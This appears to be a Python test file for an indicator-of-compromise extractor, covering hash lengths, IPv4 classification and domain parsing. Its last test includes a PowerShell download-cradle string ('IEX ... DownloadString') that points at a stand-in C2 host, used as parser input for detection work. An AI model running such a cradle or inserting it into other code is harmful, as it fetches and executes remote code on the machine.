import hashlib

from titan_decoder.utils.helpers import extract_iocs


def test_hash_ioc_only_matches_real_digest_lengths():
    # Real hash digest lengths should be detected.
    for algo in ("md5", "sha1", "sha224", "sha256", "sha384", "sha512"):
        digest = hashlib.new(algo, b"sample").hexdigest()
        assert digest in extract_iocs(f"file {digest} seen")["hashes"], algo


def test_hash_ioc_ignores_non_standard_hex_runs():
    # Hex-encoded payloads / arbitrary hex runs of non-hash length must not be
    # reported as hash IOCs.
    hex_text = (
        "48656c6c6f20576f726c6420746573740a"  # 34 chars: hex of "Hello World test\n"
    )
    assert extract_iocs(hex_text)["hashes"] == []

    for length in (31, 33, 34, 39, 41, 50, 63, 65, 95, 127):
        run = "a" * length
        assert extract_iocs(f"id={run}")["hashes"] == [], length


def test_ipv4_ioc_rejects_invalid_octets():
    # Octets > 255 are not valid IPv4 addresses and must not be extracted.
    for bad in ("999.999.999.999", "256.1.1.1", "300.400.500.600"):
        iocs = extract_iocs(f"addr {bad} seen")
        assert iocs["ipv4"] == [], bad
        assert iocs["ipv4_public"] == [], bad


def test_ipv4_ioc_public_private_classification():
    iocs = extract_iocs(
        "external 8.8.8.8 internal 192.168.1.1 10.0.0.1 loopback 127.0.0.1 "
        "linklocal 169.254.1.1 cgnat 100.64.0.1 edge 172.32.0.1"
    )
    # Globally routable addresses are public.
    assert "8.8.8.8" in iocs["ipv4_public"]
    assert "172.32.0.1" in iocs["ipv4_public"]  # outside RFC1918 172.16/12
    # RFC1918 + loopback + link-local + CGNAT are not public.
    for ip in ("192.168.1.1", "10.0.0.1", "127.0.0.1", "169.254.1.1", "100.64.0.1"):
        assert ip in iocs["ipv4_private"], ip
        assert ip not in iocs["ipv4_public"], ip


def test_domain_extraction_drops_filenames():
    from titan_decoder.utils.helpers import extract_iocs

    text = (
        "open config.json and gate.php, see report.pdf data.csv style.css app.exe; "
        "c2 is evil-corp.net via cdn.bad.example.org"
    )
    domains = extract_iocs(text)["domains"]
    for filename in (
        "config.json",
        "gate.php",
        "report.pdf",
        "data.csv",
        "style.css",
        "app.exe",
    ):
        assert filename not in domains
    assert "evil-corp.net" in domains
    assert "cdn.bad.example.org" in domains


def test_domain_extraction_keeps_cctld_lookalikes():
    # .sh / .py are real ccTLDs and must NOT be treated as file extensions.
    from titan_decoder.utils.helpers import extract_iocs

    domains = extract_iocs("hosts evil.sh and paraguay.py")["domains"]
    assert "evil.sh" in domains
    assert "paraguay.py" in domains


def test_domain_extraction_drops_dotnet_code_identifiers():
    # Download-cradle payloads embed dotted .NET member access that the domain
    # regex would otherwise flag as bogus two-label domains (net.webclient).
    text = (
        "IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.net/s.ps1'); "
        "$c = New-Object Net.HttpWebRequest"
    )
    iocs = extract_iocs(text)
    assert "net.webclient" not in iocs["domains"]
    assert "net.httpwebrequest" not in iocs["domains"]
    # The real C2 domain and URL must still be extracted.
    assert "c2.evil.net" in iocs["domains"]
    assert "http://c2.evil.net/s.ps1" in iocs["urls"]
